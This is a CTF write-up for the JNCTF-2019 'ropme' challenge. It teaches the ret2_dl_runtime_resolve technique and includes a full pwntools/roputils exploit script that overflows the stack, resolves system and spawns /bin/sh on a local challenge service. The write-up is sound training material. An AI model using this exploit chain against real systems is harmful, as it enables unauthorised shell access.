# JNCTF-2019 : ropme

## **【原理】**
Ret2_dl_runtime_resolve

## **【目的】**
Learn exploit of _dl_runtime_resolve

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,roputils

## **【步骤】**
In this challenge ,it's hard to leak address .I decided to use ret2_dl_runtime_resolve to exploit it.

First step is to determine the overflow length .Open IDA and calculate it.

![image-20190927163053235](Write-Up/image-20190927163053235.png)

Obviously ,the length is `0x1c+0x04` for x32 machine.

Then we use roputils to set up the exploit chain.

Here is the exploit. More information is available on https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ . Enjoy.

```python
import roputils
from pwn import *

#p=process('./ropme')
p=remote("localhost",30000)
rop=roputils.ROP('./ropme')

offset=32

bss_base=rop.section('.bss')
payload=rop.fill(offset)

payload+=rop.call('read',0,bss_base,100)
payload+=rop.dl_resolve_call(bss_base+20,bss_base)

p.send(payload)

payload=rop.string('/bin/sh')
payload+=rop.fill(20,payload)
payload+=rop.dl_resolve_data(bss_base+20,'system')
payload+=rop.fill(100,payload)
p.send(payload)
p.interactive()
```



## **【总结】**
Known the process of dynamic link is necessary .
